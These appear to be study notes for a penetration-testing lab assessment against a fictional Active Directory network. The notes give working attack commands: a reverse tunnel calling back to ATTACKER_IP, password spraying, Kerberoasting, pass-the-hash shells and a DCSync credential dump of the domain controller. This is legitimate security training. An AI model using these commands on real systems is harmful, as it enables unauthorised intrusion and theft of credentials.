# 🎯 Skills Assessment — Password Attacks

> **Module Section:** 26 / 26 — Password Attacks (Final)

## The Credential Theft Shuffle

Coined by **Sean Metcalf**, the **Credential Theft Shuffle** is the systematic path attackers follow to compromise Active Directory environments via stolen credentials.

### The Chain

```
1. Initial Access (phishing, exposed service)
        │
        ▼
2. Local Admin on a Foothold
        │
        ▼
3. Extract Credentials (Mimikatz, LSASS dump)
        │
        ▼
4. Lateral Movement (PtH, PtT, NetExec, PSRemoting)
        │
        ▼
5. Harvest More Credentials on New Hosts
        │
        ▼
6. Escalate → Domain Admin → DCSync → Full Compromise
```

### Defensive Countermeasures (per Metcalf)

- ✅ **LAPS** — randomized local admin passwords
- ✅ **MFA** — required for all admin functions
- ✅ **Tiered admin model** — no DA on workstations
- ✅ **Credential Guard** — protects LSASS
- ✅ **Privileged Access Workstations (PAWs)**
- ✅ **Restrict admin privileges** to only what's needed
- ✅ **Monitor for lateral movement** — Service creation, PSRemoting, WMI

---

## 🎯 Assessment Scenario

**Target:** Nexura LLC

### Known Intel

- **Target user:** Betty Jayde
- **Known password:** `Texas123!@#` (reused on multiple websites)
- **Hypothesis:** Password may be reused at work

### Objective

> Infiltrate Nexura's network → gain command execution on the **Domain Controller (DC01)**

### In-Scope Hosts

| Host | External IP | Internal IP | Role |
|------|-------------|-------------|------|
| **DMZ01** | `10.129.*.*` | `172.16.119.13` | Public-facing — our entry point |
| **JUMP01** | — | `172.16.119.7` | Internal jump host |
| **FILE01** | — | `172.16.119.10` | Internal file server |
| **DC01** | — | `172.16.119.11` | 🏆 **Domain Controller — target** |

### Network Topology

```
┌──────────────┐         ┌──────────────┐
│ Attack Host  │────────▶│   DMZ01      │◀── ONLY external-facing
│ (Kali)       │         │  10.129.*.*  │
└──────────────┘         │ 172.16.119.13│
                         └──────┬───────┘
                                │ (pivot here)
                ┌───────────────┼───────────────┐
                ▼               ▼               ▼
        ┌────────────┐  ┌────────────┐  ┌────────────┐
        │  JUMP01    │  │  FILE01    │  │   DC01 🏆  │
        │.119.7      │  │.119.10     │  │.119.11     │
        └────────────┘  └────────────┘  └────────────┘
                        172.16.119.0/24
```

---

## 🗺️ Attack Plan

### Phase 1: External Recon & DMZ Foothold

- [ ] Nmap against DMZ01 external IP — identify exposed services
- [ ] Enumerate web apps / services — look for creds reuse opportunities
- [ ] Try **Betty Jayde** with password `Texas123!@#`
- [ ] Check for service/admin creds leaked via misconfigs

### Phase 2: Set Up the Pivot

Once foothold on DMZ01 is achieved:

- [ ] **Identify routing** — verify DMZ01 has access to `172.16.119.0/24`
- [ ] **Port forward / SOCKS proxy** via Chisel, SSH dynamic forward, or Ligolo-ng
- [ ] Update **`/etc/proxychains.conf`** or use **ProxyChains-ng**
- [ ] Add `/etc/hosts` entries:
  ```
  172.16.119.7  JUMP01
  172.16.119.10 FILE01
  172.16.119.11 DC01
  ```

### Phase 3: Internal Enumeration

- [ ] `proxychains nxc smb 172.16.119.0/24` — spray known creds across internal hosts
- [ ] Enumerate shares, users, policies (LDAP via LDAPSearch / `nxc ldap`)
- [ ] Check **FILE01** shares for credentials in configs / scripts (Credential Hunting)
- [ ] Check for **SYSVOL / GPP** passwords on DC01

### Phase 4: Credential Extraction & Lateral Movement

- [ ] Dump hashes / tickets from any compromised host
- [ ] **PtH / PtT** with gathered credentials
- [ ] Target **Remote Management Users** membership for WinRM access
- [ ] Look for service accounts (Kerberoastable SPNs)

### Phase 5: DC Compromise

- [ ] Admin on DC01 → **Evil-WinRM** / **wmiexec**
- [ ] Alternative: **DCSync** via compromised privileged account
- [ ] Capture flag / prove command execution

---

## 🛠️ Toolkit Cheatsheet

### Pivoting

```bash
# Chisel reverse SOCKS
# Attacker side:
./chisel server --reverse -p 8080

# DMZ01 side (after upload):
./chisel client ATTACKER_IP:8080 R:1080:socks
```
> Sets up a Chisel reverse SOCKS tunnel: server on the attacker, client on the pivot. Routes proxychains traffic through DMZ01 into the internal subnet. Swap `ATTACKER_IP` and ports for your setup.

```bash
# SSH dynamic port forward (if SSH foothold)
ssh -D 1080 user@DMZ01
```
> Opens a SOCKS proxy on local port 1080 through an SSH session to the pivot. Simplest pivot when you already have SSH on DMZ01. Point proxychains at `127.0.0.1:1080`.

```bash
# Ligolo-ng (preferred for AD)
# Attacker:
./proxy -selfcert
# Agent on DMZ01:
./agent -connect ATTACKER_IP:11601 -ignore-cert
```
> Ligolo-ng tunnel: proxy on the attacker, agent on the pivot. Preferred for AD because it presents a real TUN interface (no proxychains needed). Swap `ATTACKER_IP` for your IP.

### Proxychains Config

```
# /etc/proxychains.conf
[ProxyList]
socks5 127.0.0.1 1080
```

### Password Spray Internal

```bash
proxychains nxc smb 172.16.119.0/24 -u bjayde -p 'Texas123!@#' --continue-on-success
proxychains nxc winrm 172.16.119.0/24 -u bjayde -p 'Texas123!@#'
proxychains nxc ldap 172.16.119.0/24 -u bjayde -p 'Texas123!@#'
```
> Sprays the reused password across the internal subnet over SMB/WinRM/LDAP through the proxy. `--continue-on-success` finds every host that accepts it. Swap user/password/subnet for your target.

### Credential Hunting

```bash
# Spider for secrets
proxychains nxc smb FILE01 -u bjayde -p 'Texas123!@#' --spider-plus
proxychains nxc smb FILE01 -u bjayde -p 'Texas123!@#' -M spider_plus --content --pattern "passw"
```
> Spiders the file server's shares for secrets; the second command searches file contents for "passw". Change `--pattern` to other keywords (`secret`, `key`) and swap the host for your target.

### Kerberoasting

```bash
proxychains impacket-GetUserSPNs nexura.local/bjayde:'Texas123!@#' -dc-ip 172.16.119.11 -request
```
> Requests TGS tickets for all Kerberoastable SPN accounts and prints crackable hashes. Swap the domain/creds and `-dc-ip` for your target; crack the output with hashcat `-m 13100`.

### AS-REP Roasting

```bash
proxychains impacket-GetNPUsers nexura.local/ -usersfile users.txt -dc-ip 172.16.119.11
```
> Finds users with Kerberos pre-auth disabled and dumps their AS-REP hashes (no password needed). Swap the domain and userlist; crack the output with hashcat `-m 18200`.

### PtH / PtT Shells

```bash
# PtH
proxychains impacket-psexec -hashes :NTLM administrator@DC01
proxychains evil-winrm -i DC01 -u administrator -H <NTLM>

# PtT (after setting KRB5CCNAME)
export KRB5CCNAME=/tmp/admin.ccache
proxychains impacket-wmiexec -k -no-pass DC01
```
> Gets a shell on DC01 via Pass-the-Hash (psexec/evil-winrm) or Pass-the-Ticket (`-k -no-pass` reads the ccache). Swap the NTLM hash, user, and ccache path for your captured credentials.

### DCSync

```bash
proxychains impacket-secretsdump -just-dc-user Administrator \
    nexura.local/<user>:<pass>@DC01
```
> DCSyncs the Administrator hash using a privileged account's credentials. Drop `-just-dc-user` to dump the entire domain. Swap the domain/creds for an account with replication rights.

---

## 🧰 Quick Command Reference

| Goal | Command |
|------|---------|
| **Port forward (SSH)** | `ssh -D 1080 user@DMZ01` |
| **Check proxy works** | `proxychains curl http://172.16.119.11` |
| **Spray SMB** | `proxychains nxc smb 172.16.119.0/24 -u USER -p 'PASS'` |
| **Dump NTDS** | `proxychains impacket-secretsdump DOMAIN/USER:PASS@DC01` |
| **Shell on DC** | `proxychains evil-winrm -i DC01 -u USER -p PASS` |

---

## Common Gotchas

- 🚨 **DNS resolution over proxy** — add hosts to `/etc/hosts`, not relying on DNS
- 🚨 **Kerberos requires hostnames** not IPs → hostnames must resolve correctly
- 🚨 **`proxychains` strict chain** can cause failures — try **proxychains-ng** with `dynamic_chain`
- 🚨 **ICMP doesn't tunnel through SOCKS** — use TCP probes (`nc -vz`) instead of `ping`
- 🚨 **Kerberos clock skew** — sync attack host clock with target DC (`ntpdate`)

---

## 📝 Assessment Workflow Checklist

1. [ ] Recon DMZ01 externally
2. [ ] Gain foothold on DMZ01
3. [ ] Stand up pivot (SOCKS)
4. [ ] Enumerate internal subnet
5. [ ] Test password reuse (`Texas123!@#`) against all internal hosts
6. [ ] Hunt credentials in file shares
7. [ ] Kerberoast / AS-REP roast
8. [ ] Dump hashes / tickets from compromised accounts
9. [ ] Pivot to DC01
10. [ ] Execute commands on DC01 → **flag**

---

## 🏁 Post-Assessment — Key Lessons to Reinforce

- **Password reuse is the #1 real-world enabler** — one external leak ripples through the entire internal network
- **DMZ hosts are stepping stones** — assume they have paths to internal systems
- **Credential hunting in shares** almost always yields something
- **NetExec is the Swiss army knife** — spray + enumerate + exploit in one tool
- **Always set up clean pivoting** before trying complex attacks — half-working tunnels waste hours

---

## Exercise Answers

*Add flag / exploitation details here as you complete the assessment*

---

## References

- [Sean Metcalf — *The Credential Theft Shuffle*](https://adsecurity.org/)
- [AD Attacks & Defense (ADSecurity.org)](https://adsecurity.org/)
- [Chisel](https://github.com/jpillora/chisel)
- [Ligolo-ng](https://github.com/nicocha30/ligolo-ng)
- [NetExec Wiki](https://www.netexec.wiki/)
- [Impacket](https://github.com/fortra/impacket)

---

## 🏆 Module Complete!

You've now completed all **26 sections** of the Password Attacks module. Here's what you covered:

| Section | Topic |
|---------|-------|
| 19 | Credential Hunting in Network Shares |
| 20 | Pass the Hash (PtH) |
| 21 | Pass the Ticket (Windows) |
| 22 | Pass the Ticket (Linux) |
| 23 | Pass the Certificate |
| 24 | Password Policies |
| 25 | Password Managers |
| 26 | Skills Assessment 🎯 |

> 💪 **Practice these techniques until they're second nature.** The real-world environments will always vary — the deeper your toolset, the more adaptable you'll be.
